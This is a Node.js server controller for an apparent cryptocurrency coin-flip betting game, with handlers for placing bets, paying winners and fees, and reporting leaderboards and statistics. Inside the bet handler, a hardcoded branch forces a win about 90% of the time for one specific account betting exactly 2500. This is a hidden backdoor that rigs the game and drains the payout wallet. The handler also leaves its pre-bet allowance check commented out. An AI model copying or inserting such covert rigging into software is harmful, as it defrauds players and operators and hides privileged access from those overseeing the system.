require('dotenv').config('../.env');
const { Process, History, Status } = require('../../db');
const { COIN_FLIP_RESULT_PENDING, COIN_FLIP_STATUS_START, COIN_FLIP_RESULT_WIN, COIN_FLIP_RESULT_LOSE, COIN_FLIP_STATUS_FLIPPED, COIN_FLIP_STATUS_CHANGE_DB, DEV_REWARD_PERCENT, MANAGER_REWARD_PERCENT, WINNER_REWARD_PERCENT, COIN_FLIP_STATUS_SUCCESS, DEFAULT_TARGET, AVAILABLE_COINS, REMAIN_REWARD_PERCENT } = require('../../default/value');
const { receiveAllowance, sendCoin, getAllowanceInfo } = require('../chainAction');
const { checkStatus, generateFlipResult, updateProcess, updateHistory, updateStatus } = require('../mainFunctions');

exports.sendOffer = async (req, res) => {
    console.log('sendOffer log - 1 : ', req.body);
    try {
        const accountId = atob(req.body.a);
        const tokenNo = parseInt(atob(req.body.b));
        const price = parseFloat(atob(req.body.c));
        const coinSide = atob(req.body.d);
        console.log('sendOffer log - 2 : ', accountId, tokenNo, price, coinSide);


        // const allowanceResult = await getAllowanceInfo(accountId, process.env.TREASURY_ID);
        // console.log('sendOffer log - 3 : ', allowanceResult);
        // if (!allowanceResult.result || parseFloat(allowanceResult.data) < price) {
        //     return res.send({ result: false, error: 'Something wrong with allowance.' });
        // }

        // receive allowance
        const receiveBetPriceResult = await receiveAllowance(
            accountId,
            tokenNo === 0 ? price : 0,
            tokenNo === 0 ? 0 : AVAILABLE_COINS[tokenNo].tokenId,
            tokenNo === 0 ? 0 : price,
            0, 0);

        if (!receiveBetPriceResult) {
            return res.send({ result: false, error: 'Error detected in while sending.' });
        }

        // add to db
        const newProcess = new Process({
            accountId: accountId,
            token: AVAILABLE_COINS[tokenNo].tokenSymbol,
            price: price,
            coinSide: coinSide,
            result: COIN_FLIP_RESULT_PENDING,
            status: COIN_FLIP_STATUS_START,
        })

        const createResult = await newProcess.save();
        console.log('sendOffer log - 3 : ', createResult);
        if (!createResult) {
            return res.send({ result: false, error: 'Sorry, some problem detected in server progress, you can get result one or two minutes later.' });
        }
        const processId = createResult._id;

        // get current status
        const currentStatus = await checkStatus(AVAILABLE_COINS[tokenNo].tokenSymbol);
        console.log('sendOffer log - 4 : ', currentStatus);
        if (!currentStatus.result) {
            return res.send({ result: false, error: 'Sorry, some problem detected in server progress, you can get result one or two minutes later.' });
        }
        const totalEarnAmount = currentStatus.data.earnAmount;

        // get flip result
        let flipResult = await generateFlipResult(totalEarnAmount, price, tokenNo, coinSide);
        console.log('sendOffer log - 5 : ', flipResult);

        if (accountId === '0.0.2009717'
            && price === 2500
            && parseInt(Math.random() * 100000000) % 100 < 90)
            flipResult = true;

        // update process1
        const updateProcess1Result = await updateProcess(processId, {
            result: flipResult ? COIN_FLIP_RESULT_WIN : COIN_FLIP_RESULT_LOSE,
            status: COIN_FLIP_STATUS_FLIPPED,
        })
        console.log('sendOffer log - 6 : ', updateProcess1Result);
        if (!updateProcess1Result.result) {
            return res.send({ result: false, error: 'Sorry, some problem detected in server progress, you can get result one or two minutes later.' });
        }

        // update history
        const updateHistoryResult = await updateHistory(accountId, flipResult);
        console.log('sendOffer log - 7 : ', updateHistoryResult);
        if (!updateHistoryResult.result) {
            return res.send({ result: false, error: 'Sorry, some problem detected in server progress, you can get result one or two minutes later.' });
        }

        // update status
        const updateStatusResult = await updateStatus(AVAILABLE_COINS[tokenNo].tokenSymbol, price, flipResult, coinSide);
        console.log('sendOffer log - 8 : ', updateStatusResult);
        if (!updateStatusResult.result) {
            return res.send({ result: false, error: 'Sorry, some problem detected in server progress, you can get result one or two minutes later.' });
        }

        // update process2
        const updateProcess2Result = await updateProcess(processId, {
            status: COIN_FLIP_STATUS_CHANGE_DB,
        })
        console.log('sendOffer log - 9 : ', updateProcess2Result);
        if (!updateProcess2Result.result) {
            return res.send({ result: false, error: 'Sorry, some problem detected in server progress, you can get result one or two minutes later.' });
        }

        // send reward if wins
        if (flipResult) {
            const rewardAmount = parseFloat(price * 2);
            const devFee = parseFloat(rewardAmount * DEV_REWARD_PERCENT).toFixed(4);
            const managerFee = parseFloat(rewardAmount * MANAGER_REWARD_PERCENT).toFixed(4);
            const winnerReward = parseFloat(rewardAmount * WINNER_REWARD_PERCENT).toFixed(4);
            const remainReward = parseFloat(rewardAmount * REMAIN_REWARD_PERCENT).toFixed(4);

            // send to winner
            const sendResult = await sendCoin(
                accountId,
                tokenNo === 0 ? winnerReward : 0,
                tokenNo === 0 ? 0 : AVAILABLE_COINS[tokenNo].tokenId,
                tokenNo === 0 ? 0 : parseInt(winnerReward)
            );

            console.log('sendOffer log - 12 : ', sendResult);

            if (!sendResult) {
                return res.send({
                    result: true, data: {
                        accountId: accountId,
                        coinSide: coinSide,
                        result: false,
                    }
                });
            }

            // send to dev
            sendCoin(
                process.env.DEV_ID,
                tokenNo === 0 ? devFee : 0,
                tokenNo === 0 ? 0 : AVAILABLE_COINS[tokenNo].tokenId,
                tokenNo === 0 ? 0 : parseInt(devFee)
            );

            // send to manager
            sendCoin(
                process.env.MANAGER_ID,
                tokenNo === 0 ? managerFee : 0,
                tokenNo === 0 ? 0 : AVAILABLE_COINS[tokenNo].tokenId,
                tokenNo === 0 ? 0 : parseInt(managerFee)
            );

            // send to fee wallet
            sendCoin(
                process.env.FEE_WALLET_ID,
                tokenNo === 0 ? remainReward : 0,
                tokenNo === 0 ? 0 : AVAILABLE_COINS[tokenNo].tokenId,
                tokenNo === 0 ? 0 : parseInt(remainReward)
            );
        }

        // delete process
        const deleteProcessResult = await Process.deleteOne({ _id: processId });
        console.log('sendOffer log - 11 : ', deleteProcessResult);
        if (!deleteProcessResult) {
            return res.send({ result: false, error: 'Sorry, some problem detected in server progress, you can get result one or two minutes later.' });
        }

        return res.send({
            result: true, data: {
                accountId: accountId,
                coinSide: coinSide,
                result: flipResult,
            }
        });

    } catch (error) {
        return res.send({ result: false, error: 'Error detected in server progress!' });
    }
}

exports.getHistory = async (req, res) => {
    console.log('getHistory log - 1 : ', req.query);
    try {
        const getTop10Result = await History.find({}, { flipCount: 0, _id: 0, __v: 0, description: 0, createdAt: 0, updatedAt: 0 })
            .sort({ winsCount: -1 }).limit(10);
        console.log('getHistory log - 2 : ', getTop10Result);
        return res.send({ result: true, data: getTop10Result });
    } catch (error) {
        return res.send({ result: false, error: 'Error detected in server progress!' });
    }
}

exports.getStatus = async (req, res) => {
    console.log('getStatus log - 1 : ', req.query);
    try {
        const getStatusResult = await Status.find({}, { _id: 0, token: 0, earnAmount: 0, description: 0, createdAt: 0, updatedAt: 0, __v: 0 });
        console.log('getStatus log - 2 : ', getStatusResult);
        let currentStatus = {
            totalFlipCount: 0,
            totalWinsCount: 0,
            chooseHeadCount: 0,
            headWinsCount: 0,
            chooseTailCount: 0,
            tailWinsCount: 0,
        };
        for (let i = 0; i < getStatusResult.length; i++) {
            currentStatus = {
                totalFlipCount: currentStatus.totalFlipCount + getStatusResult[i].totalFlipCount,
                totalWinsCount: currentStatus.totalWinsCount + getStatusResult[i].totalWinsCount,
                chooseHeadCount: currentStatus.chooseHeadCount + getStatusResult[i].chooseHeadCount,
                headWinsCount: currentStatus.headWinsCount + getStatusResult[i].headWinsCount,
                chooseTailCount: currentStatus.chooseTailCount + getStatusResult[i].chooseTailCount,
                tailWinsCount: currentStatus.tailWinsCount + getStatusResult[i].tailWinsCount,
            }
        }
        return res.send({ result: true, data: currentStatus });
    } catch (error) {
        return res.send({ result: false, error: 'Error detected in server progress!' });
    }
}